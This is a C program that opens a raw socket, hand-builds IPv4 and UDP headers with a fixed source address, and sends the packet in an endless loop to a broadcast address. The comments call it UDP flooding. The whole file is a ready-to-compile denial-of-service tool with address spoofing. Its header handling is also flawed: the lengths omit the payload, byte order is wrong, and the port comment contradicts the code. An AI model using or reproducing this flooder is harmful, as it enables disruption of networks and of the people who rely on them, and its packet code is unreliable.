#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define SRC_IP "192.168.33.123"
#define DST_IP "192.168.1.255"
#define DST_PORT 0 // Use a random port for UDP flooding

// Simple checksum function
unsigned short checksum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main() {
    int sockfd;

    // Create a raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd == -1) {
        perror("socket");
        return 1;
    }

    // Enable IP_HDRINCL to provide our own IP header
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1) {
        perror("setsockopt");
        return 1;
    }

    // Set up the target address structure
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(DST_IP);
    target_addr.sin_port = htons(DST_PORT);

    // Create a buffer for the IP header
    char packet[4096];
    memset(packet, 0, sizeof(packet));

    // Set up the IP header
    struct iphdr *ip_header = (struct iphdr *)packet;
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
    ip_header->id = htons(54321);
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_UDP;
    ip_header->check = 0; // To be filled in later
    ip_header->saddr = inet_addr(SRC_IP);
    ip_header->daddr = target_addr.sin_addr.s_addr;

    // Calculate and set IP header checksum
    ip_header->check = checksum((unsigned short *)packet, ip_header->ihl << 1);

    // Set up the UDP header
    struct udphdr *udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
    udp_header->source = htons(12345); // Source port
    udp_header->dest = target_addr.sin_port;
    udp_header->len = htons(sizeof(struct udphdr));
    udp_header->check = 0; // No checksum for now

    // Fill the buffer with data to flood (adjust as needed)
    char flood_data[] = "FloodDataHere";
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), flood_data, sizeof(flood_data));

    // Send the packets in a loop
    while (1) {
        if (sendto(sockfd, packet, ip_header->tot_len, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) == -1) {
            perror("sendto");
            break;
        }
    }

    close(sockfd);
    return 0;
}
